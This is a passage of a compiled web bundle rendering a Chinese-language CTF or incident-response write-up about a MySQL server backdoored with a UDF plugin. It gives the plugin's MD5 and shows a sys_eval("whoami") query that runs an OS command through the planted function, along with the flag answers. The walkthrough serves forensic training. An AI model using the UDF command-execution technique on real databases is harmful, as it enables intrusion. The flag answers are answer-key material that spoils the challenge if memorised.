MD5"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"/usr/lib/mysql/plugin/udf.so\nb1818bde4e310f3d23f1005185b973e7\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230\u7b54\u6848"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"flag{b1818bde4e310f3d23f1005185b973e7}\n"})}),"\n",(0,r.jsx)(n.h2,{id:"4",children:"4"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u9ed1\u5ba2\u83b7\u53d6\u7684\u6743\u9650 flag{whoami \u540e\u7684\u503c }"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u76f4\u63a5\u6267\u884c udf \u4e2d\u7684\u51fd\u6570\u5373\u53ef"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:'MariaDB [(none)]> select * from mysql.func;\n+----------+-----+-------------+----------+\n| name     | ret | dl          | type     |\n+----------+-----+-------------+----------+\n| sys_eval |   0 | mysqludf.so | function |\n+----------+-----+-------------+----------+\n1 row in set (0.00 sec)\n\nMariaDB [(none)]> select sys_eval("whoami");\n+--------------------+\n| sys_eval("whoami") |\n+--------------------+\n| mysql              |\n+--------------------+\n1 row in set (0.01 sec)\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230\u7b54\u6848"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"flag{mysql}\n"})})]})}function p(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(m,{...e})}):m(e)}},28453:(e,n,s)=>{s.d(n,{R:()=>o,x:()=>t});var a=s(96540);const r={},l=a.createContext(r);function o(e){const n=a.useContext(l);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),a.createElement(l.Provider,{value:n},e.children)}}}]);